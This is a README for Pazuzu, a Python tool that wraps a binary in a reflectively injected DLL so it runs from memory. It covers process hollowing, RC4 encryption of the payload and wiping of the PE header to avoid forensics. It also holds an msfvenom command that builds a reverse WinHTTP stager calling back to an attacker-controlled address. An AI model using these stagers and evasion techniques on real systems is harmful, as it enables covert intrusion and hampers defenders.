# Pazuzu
Pazuzu is a Python script that allows you to embed a binary within a precompiled DLL which uses reflective DLL injection.
The goal is that you can run your own binary directly from memory. This can be useful in various scenarios. 

For example, if you want to exploit a vulnerability and run your own executable instead of a third party reflective DLL. In this case you just have to choose the stager you like (reverse TCP, HTTP, HTTPS, etc.) and set the DLL generated by Pazuzu. Pazuzu  will execute the binary within the address space of the vulnerable process as long as it has the .reloc section.

![Alt text](https://github.com/BorjaMerino/Pazuzu/blob/master/Docs/reloc.png "Reloc")

**Restrictions**
 
* Not all binaries can be run from memory. For example, applications which require .NET CLR (managed code) won't be run. I will try to implement this in a upcoming version. By now you can download and run .NET application with the -d option which downloads and run it from disk (noisy option).
* If .reloc section is not present the script will use a "process hollowing" approach.
* Support for 32-bit for now.

**How-to**
* The script Pazuzu.py accepts as input the binary you want to run from memory (parameter **-f**). Depending on the properties of the binary Pazuzu will choose one of the 3 DLL currently available. These DLL are:
  1. **reloc­x86.dll**: lets you run the binary inside the address space of the process. This option is the most favorable since the binary generates less "noise" in the system. 
  2. **dforking­x86.dll**: the binary in this case also runs from memory but using "process hollowing". This technique is the one used by the ["execute" command with the -m flag](https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram) in Meterpreter.
  3. **download­86.dll**: this is the noisiest option since the binary will be downloaded and executed from disk.

* Pazuzu also provides some additional features. For example, the **-x** option will encrypt the section containing the binary by using a random RC4 key (which is stored in the DLL TimeStamp). In addition, after running it the PE header of the DLL and the binary section will be overwritten with zeros. I will add more anti-forensic techniques in future versions.

**Examples**
* To recover the Pazuzu DLL I will use a WinHTTP stager:
```
root@kali:~# msfvenom -p windows/dllinject/reverse_winhttp lhost=192.168.1.44 lport=8080 dll=. -f exe -o Winhttp-stager.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 908 bytes
Saved as: Winhttp-stager.exe
```
Let's run Pazuzu.py with the regshot.exe binary (.section present):

![Alt text](https://github.com/BorjaMerino/Pazuzu/blob/master/Docs/ejemplo1.png "Regshot.exe (.reloc present)")

Let's run it now with the verbose option to see more detailed information:

![Alt text](https://github.com/BorjaMerino/Pazuzu/blob/master/Docs/ejemplo2.png "Verbose output")

The next example will use putty.exe which has no reloc section. I have chosen "c:\windows\write.exe" to be "hollowed out" and I have encrypted the binary section with RC4. The hidden option **-m** just run msfvenom with a winhttp dllinject stager.

![Alt text](https://github.com/BorjaMerino/Pazuzu/blob/master/Docs/ejemplo3.png "Putty.exe (no .reloc present)")

 Here the Process Explorer ouput:

![Alt text](https://github.com/BorjaMerino/Pazuzu/blob/master/Docs/ejemplo3-1.png "Putty.exe (Process Explorer)")
